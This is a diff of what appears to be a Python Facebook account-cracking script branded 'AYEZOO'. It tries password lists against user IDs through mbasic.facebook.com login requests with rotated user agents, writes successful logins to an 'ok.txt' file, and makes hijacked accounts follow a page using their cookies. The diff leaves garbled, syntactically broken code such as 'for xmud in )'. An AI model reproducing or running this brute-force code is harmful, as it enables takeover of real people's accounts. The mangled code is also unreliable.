@@ -8,37 +8,8 @@
 			except IOError:
 				exit("\n [!] file %s not found"%(fileX))
 
-def setting():
-	hu = ("2")
-	if hu in ['1','01']:
-		for tua in sorted(id):
-			id2.append(tua)
 
-	elif hu in ['2','02']:
-		muda=[]
-		for bacot in sorted(id):
-			muda.append(bacot)
-		bcm=len(muda)
-		bcmi=(bcm-1)
-		for xmud in range(bcm):
-			id2.append(muda[bcmi])
-			bcmi -=1
-	elif hu in ['3','03']:
-		for bacot in id:
-			xx = random.randint(0,len(id2))
-			id2.insert(xx,bacot)
-	else:
-		print (' [!] Choose Correct Option')
-		exit()
-	clear()
-	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 \033[1;97m')
-	hc = input ("\n [#] method : ")
-	if hc in ['1','01']:
-		method.append('mobile')
-	elif hc in ['2','02']:
-		method.append('free')
-	else:
-		method.append('mobile')
+		for xmud in )
 	passmenu()
 def passmenu():
 	clear()
@@ -86,25 +57,7 @@ def passmenu():
 				ok.append(wrt)
 				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
-				break
-
-			else:
-				continue
-	exce s.exceptions.ConnectionError:
-			time.sleep(31)
-	loop+=1
-def free(idf,pwv):
-	global loop,ok,cp
-	bi = random.choice([u,k,kk,b,h,hh])
-	pers = loop*100/len(id2)
-	fff = '%'
-	sys.stdout.write('\r %s[ AYEZOO] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
-	sys.stdout.flush()
-	ua = random.choice(ugen)
-	ua2 = random.choice(ugen2)
-	ses = requests.Session()
-	for pw in pwv:
-		try:
+		
 			pw = pw.lower()
 			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
@@ -134,28 +87,7 @@ def free(idf,pwv):
 	get = r.find('a', string='Follow').get('href')
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
-logo = ("""\033[1;30m                                   
-  #    #### ##### ####   ###   ###  
- # #  #   # #         # #   # #   # 
-#####  #### ####   ###  #   # #   # 
-#   #  #  # #         # #   # #   # 
-#   # #   # ##### ####   ###   ###                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
-\033[1;32mNAM TO SUNA HOGA AYEZOO
-\033[;33mCLEAR FECBOOK DATA TO OEPN CP ID JUST NOW
-••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;33m
-    \033[1;30mAuther  : AYEZOO 786
-   \033[1;33m Admin. : AYEZOO 786
-     \033[1;33mStatus : PAID
-     \033[1;30mGithub : AYEZOO1
-    \033[1;36mVersion : 1.1
-\033[1;36mWhatsapp : +92 326 9932456
-••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;32m""")
 
-class Main:
-	def __init__(self):
-		
-			os.system("xdg-open https://chat.whatsapp.com/Dof6ISRRtLO6Dtl9n6dNJh")
-			print("")
 			time.sleep(2.0)
 			print("\033[1;33m    What is your name")
 			print("")
